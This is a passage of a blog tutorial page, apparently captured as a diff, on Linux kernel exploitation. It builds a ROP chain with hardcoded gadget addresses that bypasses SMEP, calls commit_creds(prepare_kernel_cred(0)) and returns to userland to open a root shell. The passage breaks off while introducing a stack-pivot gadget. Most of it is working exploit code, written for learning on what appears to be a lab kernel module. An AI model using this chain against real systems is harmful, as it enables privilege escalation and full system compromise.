+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> cmp_rdx_jne_pop2_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81964cc4</span>; <span style="color:#6272a4">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> mov_rdi_rax_jne_pop2_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8166fea3</span>; <span style="color:#6272a4">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+</span></span></span></code></pre></div><p>The goal with these 3 gadgets is to move <code>rax</code> into <code>rdi</code> without taking the <code>jne</code>. So I have to pop the value 8 into <code>rdx</code>, then return to a <code>cmp</code> instruction to make the comparison equals, which will make sure that we won’t jump to <code>jne</code> branch:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> pop_rdx_ret;
+</span></span><span style="display:flex;"><span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8</span>; <span style="color:#6272a4">// rdx &lt;- 8
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> cmp_rdx_jne_pop2_ret; <span style="color:#6272a4">// make sure JNE doesn&#39;t branch
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> mov_rdi_rax_jne_pop2_ret; <span style="color:#6272a4">// rdi &lt;- rax
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> commit_creds; <span style="color:#6272a4">// commit_creds(prepare_kernel_cred(0))
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>...
+</span></span></code></pre></div><p>Secondly, it seems that <code>ROPgadget</code> can find <code>swapgs</code> just fine, but it can’t find <code>iretq</code>, so I have to use <code>objdump</code> to look for it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>objdump <span style="color:#ff79c6">-</span>j .text <span style="color:#ff79c6">-</span>d <span style="color:#ff79c6">~/</span>vmlinux <span style="color:#ff79c6">|</span> grep iretq <span style="color:#ff79c6">|</span> head <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">ffffffff8100c0d9</span>:       <span style="color:#bd93f9">48</span> cf                   iretq  
+</span></span></code></pre></div><p>With the gadgets in hand, we can build the full ROP chain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> user_rip <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>)get_shell;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81006370</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> pop_rdx_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81007616</span>; <span style="color:#6272a4">// pop rdx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> cmp_rdx_jne_pop2_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81964cc4</span>; <span style="color:#6272a4">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> mov_rdi_rax_jne_pop2_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8166fea3</span>; <span style="color:#6272a4">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> commit_creds <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff814c6410</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> prepare_kernel_cred <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff814c67f0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> swapgs_pop1_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8100a55f</span>; <span style="color:#6272a4">// swapgs ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> iretq <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8100c0d9</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">overflow</span>(<span style="color:#8be9fd">void</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">50</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> payload[n];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> off <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> cookie;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// r12
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> pop_rdi_ret; <span style="color:#6272a4">// return address
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rdi &lt;- 0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> prepare_kernel_cred; <span style="color:#6272a4">// prepare_kernel_cred(0)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> pop_rdx_ret;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8</span>; <span style="color:#6272a4">// rdx &lt;- 8
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> cmp_rdx_jne_pop2_ret; <span style="color:#6272a4">// make sure JNE doesn&#39;t branch
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> mov_rdi_rax_jne_pop2_ret; <span style="color:#6272a4">// rdi &lt;- rax
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> commit_creds; <span style="color:#6272a4">// commit_creds(prepare_kernel_cred(0))
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> swapgs_pop1_ret; <span style="color:#6272a4">// swapgs
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// dummy rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> iretq; <span style="color:#6272a4">// iretq frame
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_rip;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_cs;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_ss;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[*] Prepared payload&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">ssize_t</span> w <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">write</span>(global_fd, payload, <span style="color:#ff79c6">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[!] Should never be reached&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And with that, we have successfully built an exploitation that bypasses <code>SMEP</code> and opens a root shell in the <em>first scenario</em>. Let’s move on to see what difficulty we might face in the second one.</p>
+<h3 id="pivoting-the-stack"><strong>Pivoting the stack</strong></h3>
+<p>It is clear that we cannot fit the whole ROP chain in the stack anymore with the assumption that we can only overflow up to the return address. To overcome that, we will again use a technique that is also quite popular in userland pwn: <code>stack pivot</code>. It is a technique which involves modifying <code>rsp</code> to point into a controlled writable address, effectively creating a fake stack. However, while pivoting the stack in userland often involves overwriting the <code>saved RBP</code> of a function, then return from it, pivoting in the kernel is much simpler. Because we have such a huge amount of gadgets in the kernel image, we can look for those which modify <code>rsp/esp</code> itself. We are most interested in gadgets that move a constant value into <code>esp</code>, just make sure that the gadget is executable, and the constant value is properly aligned. This is the gadget that I ended up using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> mov_esp_pop2_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8196f56a</span>; <span style="color:#6272a4">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
+</span></span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/linux">linux</a></li>
+					
+					<li><a href="/tags/kernel">kernel</a></li>
+					
+					<li><a href="/tags/smep">SMEP</a></li>
+					
+					<li><a href="/tags/rop">rop</a></li>
+					
+					<li><a href="/tags/exploitation">exploitation</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2025  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
